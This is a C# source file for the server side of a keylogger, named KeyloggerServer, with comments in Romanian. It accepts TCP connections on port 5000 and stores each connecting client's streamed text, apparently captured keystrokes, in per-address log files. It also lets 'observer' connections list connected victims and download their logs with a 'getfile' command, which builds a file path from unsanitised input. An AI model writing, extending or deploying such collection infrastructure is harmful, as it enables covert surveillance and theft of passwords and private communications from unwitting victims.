using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using Common;

namespace ServerCore
{
    public class KeyloggerServer : ISubject
    {
        private readonly List<ClientHandler> _clients = new List<ClientHandler>();
        private readonly List<IObserver> _observers = new List<IObserver>();
        private readonly object _lock = new object();
        private TcpListener _listener;
        private bool _running = false;

        public async Task RunAsync(CancellationToken cancellationToken = default)
        {
            Console.WriteLine("Starting server on port 5000...");
            Directory.CreateDirectory("SaveData");

            _listener = new TcpListener(IPAddress.Any, 5000);
            _listener.Start();

            _running = true;
            Console.WriteLine("Server is running. Press Ctrl+C to stop...");
            //_ = Task.Run(AcceptClientsLoop);

            //await Task.Delay(Timeout.Infinite); // menține serverul activ la nesfârșit
            try
            {
                var acceptTask = Task.Run(() => AcceptClientsLoop(), cancellationToken);

                // Așteptăm fie cancelare, fie până când serverul este oprit
                while (_running && !cancellationToken.IsCancellationRequested)
                {
                    await Task.Delay(1000, cancellationToken);
                }
            }
            finally
            {
                _running = false;
                _listener.Stop();
                Console.WriteLine("Server stopped");
            }
        }

        public async Task StopAsync()
        {
            _running = false;
            _listener?.Stop();

            // Oprire toți clienții
            lock (_lock)
            {
                foreach (var client in _clients.ToList())
                {
                    client.TcpClient.Close();
                }
                _clients.Clear();

                foreach (var observer in _observers.ToList())
                {
                    (observer as ObserverClient)?.Close();
                }
                _observers.Clear();
            }

            await Task.CompletedTask;
        }

        private async Task AcceptClientsLoop()
        {
            while (_running)
            {
                try
                {
                    TcpClient tcpClient = await _listener.AcceptTcpClientAsync();
                    string role = await ReadRoleAsync(tcpClient);

                    if (role.Equals("observer", StringComparison.OrdinalIgnoreCase))
                    {
                        var observer = new ObserverClient(tcpClient);
                        lock (_lock) _observers.Add(observer);
                        Console.WriteLine($"Observer registered: {observer.Id}");
                        _ = Task.Run(() => KeepAliveObserver(observer));
                    }
                    else
                    {
                        var handler = new ClientHandler
                        {
                            TcpClient = tcpClient,
                            Id = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).ToString()
                        };

                        lock (_lock) _clients.Add(handler);
                        Console.WriteLine($"Standard client connected: {handler.Id}");
                        _ = HandleClientAsync(handler);
                    }
                }
                catch (Exception ex)
                {
                    throw new KeyloggerException("Failed to accept or process incoming client.", ex);
                }
            }
        }

        private async Task<string> ReadRoleAsync(TcpClient client)
        {
            var buffer = new byte[10];
            var stream = client.GetStream();
            int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
            return Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim('\0', '\r', '\n', ' ');
        }

        private async Task HandleClientAsync(ClientHandler handler)
        {
            var stream = handler.Stream;
            var buffer = new byte[1024];
            string safeFileName = handler.Id.Replace(":", "_");
            string filePath = "SaveData\\" + safeFileName + ".txt";

            StreamWriter writer = null;

            try
            {
                writer = new StreamWriter(filePath, append: true);
                while (_running && handler.TcpClient.Connected)
                {
                    int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                    if (bytesRead == 0) break;

                    string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine($"[{handler.Id}] {message}");

                    await writer.WriteAsync(message);
                    await writer.FlushAsync();

                    Notify("[" + handler.Id + "]" + message);
                }
            }
            catch (Exception ex)
            {
                throw new KeyloggerException($"Error while handling client {handler.Id}.", ex);
            }
            finally
            {
                if (writer != null)
                    writer.Dispose();

                Console.WriteLine($"Client disconnected: {handler.Id}");
                handler.TcpClient.Close();
                lock (_lock) _clients.Remove(handler);
            }
        }

        private async Task KeepAliveObserver(IObserver observer)
        {
            try
            {
                while (_running)
                {
                    var client = observer as ObserverClient;
                    var stream = client.Stream;
                    var buffer = new byte[1024];

                    while (_running && client.TcpClient.Connected)
                    {
                        if (stream.DataAvailable)
                        {
                            int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                            if (bytesRead == 0)
                                break;

                            string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                            Console.WriteLine("[Observer " + client.Id + "] Command: " + command);

                            if (command.Equals("list", StringComparison.OrdinalIgnoreCase))
                            {
                                string response;
                                lock (_lock)
                                {
                                    var ids = _clients.Select(c => c.Id);
                                    response = "[LIST]" + string.Join("\n", ids);
                                }

                                byte[] responseData = Encoding.UTF8.GetBytes(response + "\n");
                                await stream.WriteAsync(responseData, 0, responseData.Length);
                            }
                            else if (command.StartsWith("getfile", StringComparison.OrdinalIgnoreCase))
                            {
                                string clientId = command.Substring("getfile".Length).Trim();
                                string safeFileName = clientId.Replace(":", "_");
                                string filePath = Path.Combine("SaveData", safeFileName + ".txt");
                                try
                                {
                                    if (File.Exists(filePath))
                                    {
                                        string fileContent;

                                        using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                                        using (var sr = new StreamReader(fs))
                                        {
                                            fileContent = await sr.ReadToEndAsync();
                                        }
                                        byte[] response = Encoding.UTF8.GetBytes("[FILE]" + fileContent);
                                        await stream.WriteAsync(response, 0, response.Length);
                                    }
                                    else
                                    {
                                        string errorMsg = "[ERROR]File not found";
                                        byte[] response = Encoding.UTF8.GetBytes(errorMsg);
                                        await stream.WriteAsync(response, 0, response.Length);
                                    }
                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine($"Error reading or sending file: {ex.Message}");                             
                                }
                            }
                        }

                        await Task.Delay(100); // Small delay to prevent CPU spin
                    }
                }
            }
            catch (Exception ex)
            {
                throw new KeyloggerException($"Error while keeping observer {observer.Id} alive.", ex);
            }
            finally
            {
                Console.WriteLine("Observer disconnected: " + observer.Id);
                lock (_lock) _observers.Remove(observer);
                (observer as ObserverClient)?.Close();
            }
        }

        public void Attach(IObserver observer)
        {
            lock (_lock) _observers.Add(observer);
        }

        public void Detach(IObserver observer)
        {
            lock (_lock) _observers.Remove(observer);
        }

        public void Notify(string message)
        {
            lock (_lock)
            {
                foreach (var obs in _observers.ToList())
                {
                    obs.Update(message);
                }
            }
        }
    }
}
